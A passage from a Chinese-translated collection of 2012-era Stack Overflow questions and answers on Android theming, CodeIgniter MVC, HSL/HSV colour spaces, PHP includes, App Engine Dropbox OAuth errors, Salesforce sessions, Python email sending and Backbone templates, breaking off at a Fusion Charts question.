我的实际应用程序主题 AppTheme 扩展了我的基础（我不记得我当时为什么这样做，这可能是不必要的）。

```
<style name="AppTheme" parent="AppBaseTheme">
    <item name="spinnerItemStyle">@style/SpinnerItemStyle</item>
    <item name="android:spinnerItemStyle">@style/SpinnerItemStyle</item>
</style> 
```

我需要覆盖`Widget.Sherlock.TextView.SpinnerItem`，如下所示：

```
<style name="SpinnerItemStyle" parent="Widget.Sherlock.TextView.SpinnerItem">
<item name="android:textAppearance">@style/TextAppearance.MySpinnerItem</item>
</style> 
```

这样做的原因是为了访问 TextApperance 小部件：`TextAppearance.Sherlock.Widget.TextView.SpinnerItem`

这被如下覆盖：

```
<style name="TextAppearance.MySpinnerItem"    parent="TextAppearance.Sherlock.Widget.TextView.SpinnerItem">
  <item name="android:textColor">#FFFFFF</item>
  <item name="android:textSize">16sp</item>
  <item name="android:textStyle">normal</item>
</style> 
```

我在尝试解决此问题时尝试获取文本的最大错误是尝试在覆盖的 SpinnerItemStyle 中直接设置 textColor。由于它使用了 textAppearance 小部件，因此它无法正常工作。

然后我的代码使这项工作看起来像这样（在我的活动的 onCreate 方法中）：

```
SpinnerAdapter spinnerAdapter = ArrayAdapter.createFromResource(this,
            R.array.call_type, R.layout.sherlock_spinner_item);

OnNavigationListener onNavigationListener = new OnNavigationListener() {
        // Get the same strings provided for the drop-down's ArrayAdapter
        String[] strings = getResources().getStringArray(R.array.call_type);

        @Override
        public boolean onNavigationItemSelected(int position, long itemId) {
            String filter = strings[position];
            filterCalls(filter);
            return true;
        }
    };

ActionBar actionBar = getSupportActionBar();
    actionBar.setNavigationMode(ActionBar.NAVIGATION_MODE_LIST);
    actionBar.setListNavigationCallbacks(spinnerAdapter,
            onNavigationListener); 
```

这允许我使用 ActionBarSherlock 在微调器下拉菜单上更改文本的颜色。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-09T15:20:04.523

ActionBarSherlock 要求您使用它的 3 个主题之一。您可以扩展它们，并覆盖下拉样式，如下所示：

```
<style name="MySherlockLightTheme" parent="Theme.Sherlock.Light">
   <item name="actionDropDownStyle">@style/MyDropDownNav</item>
</style> 
```

这是假设您想要全息光主题，并且您的下拉样式是 MyDropDownDav。

然后在您的代码中，您只需切换到使用您的主题（在清单中，或者在 Activity 的 onCreate 中执行）。

# php - 如何使用 CodeIgntier 从模型中访问控制器？

> ID：11396778
> 
> 赞同：0
> 
> 时间：2012-07-09T14:11:53.343
> 
> 标签：php, codeigniter

我想`application/controller/example.php`从位于的模型中访问位于 中的控制器`application/model/users.php`

```
 class Users extends CI_Model {

    //access the example.php controller

   } 
```

我谁能做到这一点？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-09T14:13:06.483

您不想这样做，因此 CodeIgniter 不能这样做。您应该从 Controller 访问其他所有内容，而不是相反。

来自 CodeIgniter 的一个很好的旧资源 :) [http://codeigniter.com/user_guide/overview/mvc.html](http://codeigniter.com/user_guide/overview/mvc.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:57:37.250

您不必从模型访问控制器。模型（视图、助手、库等）都应该从控制器访问。（模型用于操作数据（通常在数据库中））

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:15:54.843

MVC 背后的想法是拥有一个模型、查看器和控制器。
换句话说，控制器处理请求，模型获取数据，查看器向用户显示一些内容。模型仅用于操作数据——不管它是数据库连接还是其他数据资源。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-10T14:50:31.163

模型是您存储业务逻辑的地方。控制器是你调用事物和操作数据的地方。视图用于创建输出。

基本上你可以从控制器中做任何事情，但这是错误的，因为它不会让你变得清晰。尝试尽可能多地卸载模型和视图，并使控制器保持小而易读，并得到很好的评论。

# c# - 验证控制 ASP.NET Internet Explorer 问题？

> ID：11396779
> 
> 赞同：0
> 
> 时间：2012-07-09T14:11:59.497
> 
> 标签：c#, asp.net, validation, sharepoint

我有以下验证控件：

```
<asp:RequiredFieldValidator ID="GebeurtenisTekstRequiredValidator" ControlToValidate="GebeurtenisTekst" Display="Dynamic" runat="server" ErrorMessage="Er is geen gebeurtenis.<br />" />
<asp:RegularExpressionValidator ID="GebeurtenisTekstMaxLength" runat="server" Display="Dynamic" ControlToValidate="GebeurtenisTekst" ValidationExpression="^[\s\S]{1,500}$" errormessage="- Maximaal 500 karakters.<br />" /> 
```

验证控制：

```
<SharePoint:InputFormTextBox RichText="false" ID="GebeurtenisTekst" runat="server" Rows="4" Columns="60" MaxLength="500" TextMode="MultiLine"></SharePoint:InputFormTextBox> 
```

在 Internet Explorer (9) 中，当我粘贴超过 500 个字符时，我没有收到消息。在 chrome 中，我收到验证消息：“Maximaal 500 karakters”。这是一个 IE 问题，我该如何解决？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:15:45.867

这是一个 Ie 9 问题，我一直处于同样的情况，似乎 ie9 没有实现所有的 data-val-* html 5 标签，这就是为什么在其他浏览器中它可能。请放心，您的编码是正确的。

# image-processing - HSL 是否优于 HSI 和 HSV 颜色空间？

> ID：11396782
> 
> 赞同：27
> 
> 时间：2012-07-09T14:12:07.307
> 
> 标签：image-processing, colors, computer-vision, color-space

HSL 是否优于 HSI 和 HSV，因为它考虑了人类的感知。对于某些图像处理算法，他们说我可以使用这些色彩空间中的任何一种，但我不确定该选择哪一种。我的意思是，算法只关心你为它们提供色调和饱和度通道，你可以选择使用哪个颜色空间

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-07-09T20:33:04.253

哪一个最好很大程度上取决于您使用它的目的。但根据我的经验，HSL（HLS）在亮度和饱和度之间存在不幸的相互作用。

这是一个将图像亮度降低 2 的示例。最左边的图像是原始图像；接下来是使用 RGB、HLS 和 HSV 的结果：

![RGB、HLS、HSV 比较](../Images/1c3f7a10158670baf82933a914689b47.png)

请注意 HLS 中蝴蝶边缘周围过于明亮和饱和的斑点，尤其是底部的红色斑点。这就是我所指的饱和问题。

此示例是在 Python 中使用[colorsys 模块](http://docs.python.org/library/colorsys.html)创建的，用于转换。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2013-06-27T18:11:08.400

由于还没有公认的答案，而且我必须进一步研究才能完全理解这一点，所以我会加两分钱。

就像其他人所说的那样，关于 HSL 或 HSV 哪个更好的答案取决于您尝试建模和操作的内容。

tl;dr - HSV 在机器视觉方面仅*比*HSL“更好”（有警告，请阅读下文）。“实验室”和其他正式的颜色模型要准确得多（但计算成本高），应该真正用于更严肃的工作。HSL 更适合“绘画”应用程序或任何其他需要人工“设置”、“输入”或以其他方式理解/理解颜色值的应用程序。

有关详细信息，请阅读以下内容：

如果您尝试对颜色的生成方式进行建模，最直观的模型是 HSL，因为它几乎直接映射到您如何混合颜料来创建颜色。例如，要创建“深”黄色，您可以将基础黄色涂料与一点黑色混合。而要创建较浅的黄色阴影，您需要混合一点白色。

HSL 中“L”光谱中 50 到 0 之间的值映射到必须混合多少“黑色”（黑色从 0 增加到 100%，随着 L 从 50 减少到 0）。

50 到 100 之间的值映射到必须混合多少“白色”（随着 L 从 50% 增加到 100%，白色从 0% 变化到 100%）。

50%“L”为您提供“最纯净”的颜色形式，没有任何来自白色或黑色的“污染”。

来自以下链接的见解：
1\. [http://forums.getpaint.net/index.php?/topic/22745-hsl-instead-of-hsv/](http://forums.getpaint.net/index.php?/topic/22745-hsl-instead-of-hsv/) 那里的最后一篇文章。
2\. [http://en.wikipedia.org/wiki/HSL_and_HSV](http://en.wikipedia.org/wiki/HSL_and_HSV) 检查 HSL 的颜色空间圆柱体 - 它非常清楚地了解我所讨论的分布类型。

另外，如果您在任何时候都处理过油漆，那么上述解释（希望）是有意义的。:)

因此，HSL 是理解如何“生成”颜色的一种非常直观的方式 - 因此它是绘画应用程序或任何其他针对习惯于以“阴影”/“色调”术语思考的受众的应用程序的绝佳模型为颜色。

现在，进入 HSV。

现在这是一个危险的领域，因为我们进入了一个基于我为理解 HSV 而制定的理论的空间，并且没有得到其他来源的验证或证实。

在我看来，HSV 中的“V”映射到物体上投射的光量，假设在零光下，物体将是完全黑暗的，而在 100% 的光下，它会是全白的。

因此，在[这个](http://commons.wikimedia.org/wiki/File:Red_Apple.jpg)苹果图像中，直接面对光源的点全是白色的，并且很可能在 100% 处有一个“V”，而底部完全处于阴影中且不受光影响的点有一个值“0”。（我没有检查这些值，只是认为它们对解释有用）。

因此，HSV 似乎比 HSL 更好地模拟了物体是如何被照亮的（因此可以解释您在机器视觉应用程序中可能必须对镜面高光或阴影执行的任何补偿）。

但是，正如您从我链接到的 Wikipedia 文章中“缺点”部分的示例中可以清楚地看到的那样，这些方法都不是完美的。“实验室”和其他更正式（计算成本更高）的颜色模型做得更好。

PS：希望这对某人有所帮助。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2012-07-09T14:22:19.993

唯一具有优势并考虑到人类感知的色彩空间是[LAB](http://en.wikipedia.org/wiki/Lab_color_space)，因为其中的欧几里得度量与人类色彩差异相关。

直接取自维基百科：

> 与 RGB 和 CMYK 颜色模型不同，Lab 颜色旨在接近人类视觉。它渴望感知均匀性，其 L 分量与人类对亮度的感知非常匹配

这就是许多计算机视觉算法正在利用 LAB 空间的原因

`HSV`，`HSB`并且`HSI`没有这个属性。所以答案是否定的，`HSL`不是人类感知意义上的`HSI`“优越”。`HSV`

如果你想接近人类的感知，试试`LAB`色彩空间。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-07-09T14:17:53.797

我会说一个不比另一个好，每个都只是另一个的数学转换。不同的表示可以使您想要的效果更容易处理图像。每个人对图像的感知都会略有不同，使用 HSI 或 HSV 可能会在输出图像中提供微小的差异。

甚至在针对系统（即像素阵列）考虑时，RGB 也会考虑到人类的感知。当成像器（带有拜耳覆盖）拍照时，每 1 个红色和蓝色像素对应 2 个绿色像素。显示器仍以 RGB 输出（尽管大多数显示器的红色和蓝色只有一个绿色像素）。夏普制造的新电视显示器现在具有黄色输出像素。他们这样做的原因是由于实际频谱中存在黄色带，因此为了更好地真实表示颜色，他们添加了黄色带（或像素）。

所有这些都是基于人眼对绿色的敏感性高于光谱中的任何其他颜色。

无论如何，无论您使用什么比例，图像都将转换回 RGB 以显示在屏幕上。

[http://hyperphysics.phy-astr.gsu.edu/hbase/vision/colcon.html](http://hyperphysics.phy-astr.gsu.edu/hbase/vision/colcon.html)

[http://www.physicsclassroom.com/class/light/u12l2b.cfm](http://www.physicsclassroom.com/class/light/u12l2b.cfm)

简而言之，我不认为任何一个比另一个更好，只是不同的表示。

[http://en.wikipedia.org/wiki/Color](http://en.wikipedia.org/wiki/Color)

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2018-04-18T02:36:28.573

Imma 在这里投入两分钱，既是一名程序员，也是一名在艺术学校获得色彩理论的人，然后才开始明智地从事软件工程职业。

HSL/HSV 非常适合轻松编写编程功能来处理颜色，而无需处理大量边缘情况。它们在准确复制人类对颜色的感知方面很糟糕。

CMYK 非常适合渲染打印内容，因为它近似于打印机所依赖的颜料。准确地复制人类对颜色的感知也很糟糕*（虽然不是因为它本身很糟糕，而是因为计算机真的不擅长在屏幕上显示它。稍后会详细介绍）*。

RGB 是技术中唯一能够准确有效地反映人类视觉的颜色实用程序。LAB 本质上只是在引擎盖下解析为 RGB。还值得考虑的是，屏幕上的文字像素是 RGB 的表示，这意味着您使用的任何其他颜色空间在实际显示时都会被解析回 RGB。真的，最好只是去掉中间人，并在几乎每一种情况下都使用它。

RGB 在编程意义上的问题在于它在表示上本质上是立方的，而 HSL/HSV 都以半径解析，这使得以编程方式创建“色轮”变得更加容易。如果不编写大量代码来处理，RGB 很难做到这一点，因为它在数据表示方面是立方解析的。然而，RGB 非常准确地反映了人类的视觉，它也是显示器所包含的实际硬件的基础。

TLDR；如果你想死在颜色上并且不介意额外的工作，那就一直使用 RGB。如果您想开发一个“足够好”的颜色实用程序，并且可能在以后遇到您无法真正做任何事情的错误票，请使用 HSL/HSV。如果您正在打印，请使用 CMYK，不是因为它好，而是因为如果您不使用它，打印机会窒息，即使它很糟糕。

* * *

顺便说一句，如果您像艺术家而不是程序员一样处理色彩理论，您会发现与任何关于色彩的技术规范真正传达的截然不同的看法。请记住，任何使用您创建的颜色实用程序的人基本上都会按照这些思路进行思考，至少如果他们在颜色理论方面有扎实的基础教育。这基本上是艺术家如何处理颜色的概念：

从艺术的角度来看，颜色基本上是在五个平面上表示的。

*   颜料（或色调），这是您要追求的实际基础颜色。
*   色调，即与纯白色混合的颜料。
*   色度，即与纯黑色混合​​的颜料。
*   色调（或“True Tone”），即颜料与不同程度的灰色混合。
*   丰富的色调（或“大地色调”），这是一种与其互补色混合的颜料。丰富的色调不会出现在色轮上，因为它们本质上是对立面的混合，并且由于物理媒体中无法在机器上有效复制的细微差异，它们在视觉上的反映与“真实色调”略有不同。

以编程方式表示这种范式的典型问题是实际上没有任何好的方法来表示丰富的色调。材料艺术家在使用绘画时基本上没有问题，因为笔触的细微差异允许补语之间的潜在差异反映在构图中。同样地，数码摄影和视频在这方面都很糟糕，但实际的模拟电影在这方面并没有那么糟糕。它更多地反映在摄影和视频中而不是计算机图形中，因为相机视口中所有东西的纹理都会吸收其中的一部分，但仍然比实际观看相同的东西要少得多（这就是为什么你永远无法真正拍摄例如，一张日落的好照片，没有大量的后期制作来破解它的字面意思）。然而，计算机不擅长复制这些差异，因为颜色基本上会解析为 RGB 像素映射的一致矩阵，在视觉上看起来像是一个平坦的规则色调。没有计算颜色空间可以准确地反映丰富的色调，因为没有计算方法可以使颜色在空间上以漫反射、非重复随机方式略有变化，并且仍然有一个唯一的标识符，而且你不能很好将其存储为没有唯一标识符的数据。

您可以使用计算机对此进行的最佳近似是创建某种颜色的某种扩散重叠另一种颜色，这不会解析为您可以表示为十六进制代码或单个数据库列中的内容的单个值。即便如此，计算机将固有地反映统一的模式，其中真正丰富的色调依赖于随机性和不重复的纹理和变化，如果不付出相当大的努力，你就无法在机器上做到这一点。所有真正使色彩流行的艺术作品都依赖于这个原则，如果没有大量的辅助工作来模拟它，计算表示基本上是无法访问的（这就是我们有 Photoshop 和 Corel Painter 的原因，因为它们可以很好地模拟这些东西需要做一些工作，但代价是执行大量对运行时效率不高的过滤）。

从艺术的角度来看，RGB 是其他四个特征的一个很好的近似。我们几乎明白它不会涵盖丰富的色调，我们将不得不破解一个设计实用程序并手动将这部分混合。然而，用 RGB 编程的根本问题是它想要解析为 3 维空间（因为它是立方体），而您试图在二维显示器上呈现它，这使得创建合理的 UI 变得非常困难直观，因为您无法以任何对最终用户来说直观的方式有效地表示计算机显示器上第三轴的深度。

* * *

您还需要考虑表示为光的颜色和表示为颜料的颜色之间的区别。RGB 是表示为光的颜色表示，对应于用于混合照明以表示颜色的主要值，并且使用 1:1 映射来实现。CMYK 代表色素沉着光谱。区别在于，当你等量混合光时，你会得到白色，当你等量混合颜料时，你会得到黑色。如果您正在对任何使用计算机的实用程序进行编程，那么您就是在使用光，因为像素本质上是显示器上发出 RGB 光波的单个节点。我之所以说 CMYK 很烂，不是因为它不准确，而是因为*当您尝试将其表示为光时它不准确，这在所有计算机显示器上都是如此*. 如果您使用的是实际的油漆、记号笔、彩色铅笔等，它就可以了。然而，在屏幕上表示 CMYK 仍然必须解析为 RGB，因为这是计算机显示器的工作方式，所以它在显示方面总是有点偏离。

* * *

不要走得太远，因为这是一个编程论坛，而您作为程序员提出了这个问题。但是，如果您追求准确性，则需要考虑一个明显的“非技术性”方面，即您的工作在实现其预期目标方面的有效性，即很好地解决视觉感知问题，这在大多数计算色彩空间。归根结底，任何颜色实用程序的目标都是使其在人类对颜色的感知方面看起来正确。HSL/HSV 在这方面都失败了。它们之所以突出，是因为它们易于编码，并且仅出于这个原因。如果您的截止日期很短，它们是可以接受的答案。如果你想要一些真的很好用的东西，那么你需要做繁重的跑腿工作并考虑这些东西，

* * *

给你一些参考点（我故意避免任何技术参考，因为它们只涉及计算视角，而不是实际的颜色感知，无论如何你可能已经阅读了所有这些）：

[色彩理论维基](https://en.wikipedia.org/wiki/Color_theory)

[色调、色调、色调和阴影的基本分类](https://www.craftsy.com/art/article/hues-tints-tones-and-shades/)

[大地色调（如果您愿意，也可以选择丰富的色调）](http://www.complex.com/style/2014/08/color-theory-facts-you-should-know/neutral-colors-are-also-known-as-earth-tones)

[配色方案的基本原理](http://www.tigercolor.com/color-lab/color-theory/color-harmonies.htm)

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2017-05-08T03:28:55.117

实际上，只要您了解在 HSV 中，饱和度是颜色的纯度，值是该颜色的强度，而不是整体的亮度，我不得不争辩说 HSV 更好地解释了人类的视觉感知。以这张图片为例...
[![光谱](../Images/1dabe850815820175ea5aec44e4c1341.png)](https://i.stack.imgur.com/96eNV.png)

这是 HSL 饱和度（左）和 HSL 亮度（右）的映射... 请注意，饱和度是 100%，直到您碰到最顶部的白色突然下降。在查看原始图像时不会感知到这种映射。亮度映射也是如此。虽然它是一个更清晰的渐变，但它只是在视觉上模糊地匹配。将其与下面的 HSV 饱和度（左）和 HSV 值（右）进行比较...... 这里可以看到饱和度映射随着颜色变得更白而下降。同样，在原始图像中可以非常清楚地看到值映射。在查看原始图像的各个颜色通道的映射时，这一点变得更加明显（非黑色区域几乎与值映射完全匹配，但与亮度映射相去甚远）......
[![HSL 饱和度](../Images/731920257c3df694b6567b21822d05c0.png)](https://i.stack.imgur.com/nFUPj.png)[![在此处输入图像描述](../Images/04e2fc0e719c1b7dd0b9bcfc9d77dfea.png)](https://i.stack.imgur.com/eJr2O.png)

[![HSV 饱和度](../Images/4c3a05dc3feace7ce6f9eadf68a78598.png)](https://i.stack.imgur.com/Nns3c.png)[![在此处输入图像描述](../Images/06c50ddd5478e421883240021410e5db.png)](https://i.stack.imgur.com/IC1dY.png)

[![红色通道](../Images/89c4d72a8d192636b2b47feb7c9ba602.png)](https://i.stack.imgur.com/dsIPR.png)[![绿色通道](../Images/4bb8aef3a538d519b9d4746511695ad9.png)](https://i.stack.imgur.com/O7WTf.png)[![蓝色通道](../Images/d72fc07f47ae92459211431677cc206e.png)](https://i.stack.imgur.com/AkDAO.png)
根据这些信息，我不得不说 HSV 更适合处理实际图像（尤其是照片），而 HSL 可能只适合在颜色选择器中选择颜色。

附带说明一下，HSV 中的值是 CMYK 中黑色的倒数。

使用 HSV 而不是 HSL 的另一个论点是，HSV 具有更少的不同值组合可以导致相同的颜色，因为 HSL 将其分辨率的一半左右丢失到其顶部锥体。假设您使用字节来表示组件 - 从而为每个组件提供 256 个唯一级别。这将在 HSL 中产生的唯一 RGB 输出的最大数量为 4,372,984 色（可用 RGB 色域的 26%）。在 HSV 中，这一数字高达 9,830,041（RGB 色域的 59%）……超过两倍。并且允许色调的范围为 0 到 359，HSV 将产生 11,780,015，而 HSL 仅会产生 5,518,160。

# php - require_once 致命错误（再一次）

> ID：11396783
> 
> 赞同：1
> 
> 时间：2012-07-09T14:12:08.430
> 
> 标签：php, fatal-error, require-once

当一切正常时，我已经像以前一样创建了超级简单的脚本。但不知何故它停止了，现在每次我尝试要求一个文件时，它都会向我显示一个错误：

> 致命错误：require_once()：在 E:\tools\EasyPHP\ 中打开所需的 'E:\tools\EasyPHP\www/registry/registry.class.php' (include_path='.;C:\php\pear') 失败第 18 行 www\index.php

我的索引文件：

```
define("APP_PATH", dirname(__FILE__)."/");
require_once(APP_PATH.'registry/registry.class.php'); 
```

这就是一切，但我仍然无法加载该页面。

我应该如何设置它？我仅将 Windows 用于本地构建。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:19:20.350

```
define( "APP_PATH", dirname( __FILE__ ) . DIRECTORY_SEPARATOR );
require_once( APP_PATH . 'registry' . DIRECTORY_SEPARATOR . 'registry.class.php' ); 
```

该常量`DIRECTORY_SEPARATOR`在 Windows 系统上计算为反斜杠，在 *nix 系统上计算为正斜杠。这样，您的代码无需修改即可在 Windows 和 Linux 环境中运行。

（[请参阅有关此常量](http://docs.php.net/manual/en/dir.constants.php)及其朋友的 PHP 手册`PATH_SEPARATOR`。）

如果您仍然遇到问题，则该文件可能在该路径中不存在，或者 PHP 没有对该文件的读取权限。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:15:15.590

你看到你`dirname()`的字符串有的结果`\`和你有的其他字符串`/`，我认为你应该只有`\`。

# python - GAE：TypeError：字符映射必须返回整数、无或 unicode

> ID：11396789
> 
> 赞同：2
> 
> 时间：2012-07-09T14:12:25.793
> 
> 标签：python, google-app-engine, unicode, oauth-2.0, dropbox

我正在尝试[在 Dropbox 中获取站点，](https://github.com/Japanuspus/Site-in-a-Dropbox)主要是为了弄清楚如何在 appengine 上使用 Dropbox。

python: c:\Program Files (x86)\Google\google_appengine>python Python 2.7.3 (default, Apr 10 2012, 23:31:26) [MSC v.1500 32 bit (Intel)] on win 32

```
Traceback (most recent call last):
  File "C:\Program Files (x86)\Google\google_appengine\google\appengine\ext\webapp\_webapp25.py", line 701, in __call__
    handler.get(*groups)
  File "C:\youiestsiteinadropbox\siteinadropbox\handlers\dropboxhandlers.py", line 38, in new_f
    f(self, *args, **kwargs)
  File "C:\youiestsiteinadropbox\siteinadropbox\handlers\dropboxhandlers.py", line 65, in get
    self.dropbox_auth_callback(self.site)
  File "C:\youiestsiteinadropbox\siteinadropbox\handlers\dropboxhandlers.py", line 118, in dropbox_auth_callback
    access_token = models.Site.dropbox_auth.obtain_access_token(token, "")
  File "C:\youiestsiteinadropbox\dropbox\auth.py", line 177, in obtain_access_token
    self.oauth_request.sign_request(self.signature_method_hmac_sha1, self.consumer, token)
  File "C:\youiestsiteinadropbox\oauth\oauth.py", line 259, in sign_request
    self.build_signature(signature_method, consumer, token))
  File "C:\youiestsiteinadropbox\oauth\oauth.py", line 263, in build_signature
    return signature_method.build_signature(self, consumer, token)
  File "C:\youiestsiteinadropbox\oauth\oauth.py", line 634, in build_signature
    hashed = hmac.new(key, raw, sha)
  File "C:\Python27\lib\hmac.py", line 133, in new
    return HMAC(key, msg, digestmod)
  File "C:\Python27\lib\hmac.py", line 72, in __init__
    self.outer.update(key.translate(trans_5C))
TypeError: character mapping must return integer, None or unicode 
```

应用程序内的最后一次调用是：

文件“C:\youiestsiteinadropbox\siteinadropbox\handlers\dropboxhandlers.py”，第 118 行，在 dropbox_auth_callback access_token = models.Site.dropbox_auth.obtain_access_token(token, "")

将此部分转换为 unicode 并没有多大成功。关于如何在 appengine 上开始使用 Dropbox 的任何想法或其他指示？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T15:59:15.330

我从来没有使用过siteinadropbox，但这个错误的最终原因是`key`最后一个变量是一个`unicode`对象，而代码期望它是一个`str`对象。我知道，这不是一条特别有用的信息。

我检查了 siteinadropbox 代码并检查了该`key`值的来源，除非某处有恶作剧，否则只有当您的`dropbox.auth.Authenticator`实例`self.consumer.secret`是 unicode 或`token.secret`from`dropbox_auth_callback`是 unicode 时，它​​才会是 unicode。粗略检查一下，我看不出这两种情况是如何发生的。`config`在创建 dict 时，您是否碰巧传入了自定义dict `Authenticator`，或者您是否遵循 using 的模式，如和示例`Authenticator.load_config`中所做的那样？`siteinadropbox/models/site.py``test/dbtools.py`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-05-17T07:24:18.990

我修改了 hmac.py，如果在调用 tranlate 之前它是 unicode，则将 key 转换为 str 对象，并且它可以工作。

```
 # hmac.py
       ...
    71 key = key + chr(0) * (blocksize - len(key))
    72 if type(key) == unicode:
    73     key = key.encode()
    74 self.outer.update(key.translate(trans_5C))
       ... 
```

# c# - Salesforce REST API 是否像 SOAP API 一样一次只允许一个连接？

> ID：11396792
> 
> 赞同：2
> 
> 时间：2012-07-09T14:12:37.663
> 
> 标签：c#, salesforce

因此，根据 Salesforce 的 SOAP api 的文档，如果我登录并启动一个在我注销前需要 1 分钟的进程，那么其他人使用相同的凭据登录并开始另一个在注销前需要 30 秒的进程，当第二个用户注销，它也会踢出第一个用户。

REST api 有这个问题吗？有办法解决吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-10T00:02:36.283

您的问题的答案是肯定的，REST Api 也有同样的问题。

来自官方文档：

> 如果多个客户端应用程序使用同一个用户登录， **它们都共享同一个会话**。如果其中一个客户端应用程序调用 logout()，它将使所有客户端应用程序的会话无效。**为每个客户端应用程序使用不同的用户**可以更轻松地避免这些限制。

销售人员建议我们避免这种情况的唯一方法是创建新用户。

您可以创建自己的中央服务来管理唯一会话，并将活动访问令牌提供给客户端，但这种方法是 force.com 平台解决方案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-10T00:43:39.740

这实际上是一个会话管理问题，而不是您想使用该会话调用的任何特定 API。也就是说，您有 2 个简单的选择。

a）不要调用注销，只是让会话基于不活动而过期，这样如果会话恰好由 2 个不同的集成共享，它不会导致问题。

b) 切换到 OAuth 进行身份验证，并为每个集成提供其自己的 OAuth 客户端/远程访问条目。（会话不在不同的 oauth 客户端之间共享）。

# python - 如何使用 python 3 发送电子邮件？

> ID：11396799
> 
> 赞同：2
> 
> 时间：2012-07-09T14:13:02.557
> 
> 标签：python, python-3.x

请帮我！我想在 python 3 中创建一个脚本，将电子邮件发送给任何人，但来自我的本地机器。我现在是 python 的初学者，这就是为什么我尝试过的大多数脚本根本不起作用的原因。如果您还解释我需要与脚本一起做什么，那将是一个很大的帮助。谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-10T08:12:52.700

这个短小的数字怎么样。

```
'''
Created on Jul 10, 2012
test email message
@author: user352472
'''
from smtplib import SMTP_SSL as SMTP
import logging
import logging.handlers
import sys
from email.mime.text import MIMEText

def send_confirmation():
    text = '''
    Hello,

    Here is your test email.

    Cheers!
    '''        
    msg = MIMEText(text, 'plain')
    msg['Subject'] = "test email" 
    me ='yourcooladdress@email.com'
    msg['To'] = me
    try:
        conn = SMTP('smtp.email.com')
        conn.set_debuglevel(True)
        conn.login('yourcooladdress', 'yoursophisticatedpassword')
        try:
            conn.sendmail(me, me, msg.as_string())
        finally:
            conn.close()

    except Exception as exc:
        logger.error("ERROR!!!")
        logger.critical(exc)
        sys.exit("Mail failed: {}".format(exc))

if __name__ == "__main__":
    logger = logging.getLogger(__name__)
    logger.setLevel(logging.DEBUG)
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)
    formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    ch.setFormatter(formatter)
    logger.addHandler(ch)

    random_ass_condition = True

    if random_ass_condition:
        send_confirmation() 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T14:25:07.840

看看以下内容：

*   [http://docs.python.org/py3k/library/smtplib.html](http://docs.python.org/py3k/library/smtplib.html)
*   [http://docs.python.org/py3k/library/email.html](http://docs.python.org/py3k/library/email.html)

它们非常易于使用，应该对基本的电子邮件消息进行分类

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-09-25T22:09:51.767

开门见山：

```
from smtplib import SMTP_SSL as SMTP
from email.mime.text import MIMEText

def send_email(subject, body, toaddr="helloworld@googlegroups.com"):
    fromaddr = "johndoe@gmail.com"
    msg = MIMEText(body, 'plain')
    msg['To'] = toaddr
    msg['Subject'] = subject

    server = SMTP('smtp.gmail.com')
    server.login(fromaddr, "y0ur_p4ssw0rd")
    server.sendmail(fromaddr, toaddr, msg.as_string())
    server.quit() 
```

所以你现在可以这样称呼它：

```
send_email(subject, body) 
```

或者您可以使用第三个参数来指定电子邮件地址：

```
send_email(subject, body, "yourfriend@gmail.com") 
```

# asp.net - ASP.NET、HTTP/S 和 PGP 框架的方法

> ID：11396804
> 
> 赞同：2
> 
> 时间：2012-07-09T14:13:19.443
> 
> 标签：asp.net, pgp

设想：

多个客户端通过 HTTP/S 将文件上传到服务器。文件将使用公司公钥加密，以便稍后在不同环境中使用公司私钥解密。上传时，文件被丢弃（用公司公钥加密）到服务器上。

反过来，公司必须将文件发回给客户。每个文档都使用客户端的公钥加密并发布到公司服务器以供检索。客户端通过 HTTP/S 登录服务器并获取加密文件。一旦文档在客户端机器上，他们将使用他们的私钥对其进行解密。

问题： - 存储客户端公钥以便应用程序可以在加密时轻松获取这些公钥的最佳方式是什么？如果是密钥服务器，密钥服务器应该驻留在哪里？- 一旦客户获取了加密文件并将其下载到他们的环境中，是否有开源选项来解密文件？

理想情况下，这是在使用 ASP.NET 的 Microsoft 环境中完成的。理想情况下，任何其他组件（包括密钥服务器）都是开源的，否则，非营利组织可以负担得起。

# templates - 骨干下划线js为模板添加价值

> ID：11396805
> 
> 赞同：0
> 
> 时间：2012-07-09T14:13:23.423
> 
> 标签：templates, backbone.js, underscore.js

我在 Backbonejs 中有一个简单的添加事件，我也有模板：

```
initialize: function()
{
    this.template = _.template($("#person-template").html());
}

renderperson: function(model)
{
    //model.name is "Jack" for example
    //Now I want to render this template with Name replaced with "Jack"?
    $("#somelement").append( ); //What to do here???
} 
```

模板很简单：

```
<script type="text/template" id="person-template">
    <div class="person"><%= Name %></div>
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:15:46.150

```
 $("#somelement").append( this.template(this.model.toJSON()) ); 
```

您可能还需要添加

```
_.bindAll(this) 
```

到你的初始化方法

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:40:03.413

可能这可以帮助你： [http ://backbonejs.org/#View-render](http://backbonejs.org/#View-render)

```
var Bookmark = Backbone.View.extend({
  render: function() {
    $(this.el).html(this.template(this.model.toJSON()));
    return this;
  }
}); 
```

# xml - 不需要时在 Firefox 上缓存 xml 的 Fusion Charts

> ID：11396808
> 
> 赞同：1
> 
> 时间：2012-07-09T14:13:28.147
> 
